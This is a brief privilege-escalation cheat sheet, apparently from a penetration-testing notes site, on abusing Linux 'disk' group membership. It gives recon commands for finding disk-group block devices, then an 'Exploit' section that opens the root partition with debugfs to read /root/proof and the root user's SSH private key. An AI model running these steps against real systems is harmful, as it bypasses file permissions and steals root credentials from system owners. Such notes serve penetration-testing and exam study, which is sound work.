# Disk group

The disk group gives the user full access to any block devices contained within /dev/. Since /dev/sda1 will in general be the global file-system, and the disk group will have full read-write privileges to this device

**Check permissions of current user:**

```sh
id
```

* 6(disk)

**List /dev devices owner and group owner:**

```sh
ls -l /dev
```

**Find the partitions owned by disk group:**

```shell
find /dev -group disk
```

**Display the available partitions:**

```sh
df -h
```

### Exploit

use debugfs to enumerate the entire disk with effectively root level privilege:

```
debugfs /dev/sda2
```

* _<mark style="color:blue;">/dev/sda2 is mounted on /</mark>_
* `cat /root/proof`
* `cat root/.ssh/id_rsa`
